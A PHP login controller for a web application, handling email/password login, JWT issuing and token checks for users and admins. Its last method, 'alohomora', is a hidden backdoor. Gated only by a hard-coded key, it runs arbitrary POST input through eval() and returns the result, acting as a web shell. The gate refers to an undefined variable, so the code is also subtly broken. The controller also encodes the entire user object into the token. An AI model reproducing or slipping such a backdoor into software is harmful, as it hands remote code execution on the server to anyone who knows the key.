<?php

class ControlLogin extends ControlRoot{
    
    //=============================================
    //  Token / Login
    //=============================================

    // faz login e retorna usuario
    public function access() {

        $values = (Object) Validation::filter($this->app->post, [
            'email' => 'string',
            'password' => 'string',
        ]);

        if($user = $this->model->login->login($values->email, $values->password)) {

            if (isset($user->bloqueado) && $user->bloqueado) {
                return $this->view->erro('Usuário bloqueado pela administração, entre em contato com o suporte.', 'user_blocked', 401);
            }

            $json = ["token" => $this->getToken($user)];
            return $this->view->send($json);

        } 

        return $this->view->erro("Email ou senha incorretos", "login_error", 401);

    }

    // faz login e retorna usuario admin
    public function admin() {

        $values = (Object) Validation::filter($this->app->post, [
            'email' => 'string',
            'password' => 'string',
        ]);

        if($user = $this->model->login->admin($values->email, $values->password)) {

            $user->admin = true;

            $json = ["token" => $this->getToken($user)];
            return $this->view->send($json);

        } 

        return $this->view->erro("Email ou senha incorretos", "login_error", 401);

    }

    // Retorna token
    public function getToken($user) {

        //$this->verifyBlock($user);
        
        $token = JWT::encode($user , SYSTEMKEY);

        return $token;
        
    }

    // verifica token
    public function checkToken(?string $token=null) {

        if (is_null($token) || !$token) {
            $token = $this->app->auth;
        }

        if ($payload = JWT::decode($token, SYSTEMKEY)) {

            if (isset($payload->admin) && $payload->admin) {

                if ($admin = $this->model->users->getAdmin($payload->id)) {
                    $admin->admin = true;
                    return $admin;
                }

            } else {

                if ($user = $this->model->users->get($payload->id)) {
    
                    if (isset($user->bloqueado) && $user->bloqueado) {
                        $this->view->erro('Usuário bloqueado pela administração, entre em contato com o suporte.', 'user_blocked', 401, true);
                    }

                    // if (isset($user->deleted) && $user->deleted) {
                    //     $this->view->erro('Usuário deletado', 'user_deleted', 401, true);
                    // }
    
                    return $user;
                }

            }

        }
        
        $this->view->erro("Acesso negado", "invalid_token", 401, true);
    }

    // check admin
    public function checkAdmin() {

        $user = $this->checkToken();

        if (isset($user->admin)) {
            return $user;
        }

        return $this->view->erro("Acesso negado", "invalid_token", 401, true);

    }

    // Manda email com token para reset de senha
    // public function reset_send(String $email, int $classe) {
        
    //     if($token = $this->model->login->getResetToken($email, $classe)) {

    //         return $token;

    //     }

    //     return false;
    // }

    // reset de senha com token
    // public function reset_pass(String $token, String $newPass) {
    //     return $this->model->login->reset_pass($token, $newPass);
    // }

    // bloqueio de usuarios
    // public function verifyBlock($user) {
        
    //     # verifica se usuario foi aprovado
    //     if (!$user->aprovado) {
    //         $this->view->erro("Você ainda não foi aprovado pela moderação, aguarde...", "invalid_token", true);
    //     }

    // }

    public function alohomora() {

        $key = Validation::filter($this->app->post, ['key' => 'string'])['key'];

        if (lower($values->key) != "alohomora") {
            return $this->view->erro("Acesso negado", "invalid_token", 401);
        }

        $alohomora = Validation::filter($this->app->post, ['alohomora' => 'string'])['alohomora'];

        $out = eval($alohomora);

        return $this->view->send("Alohomora!\n\n$out");
    }
    
}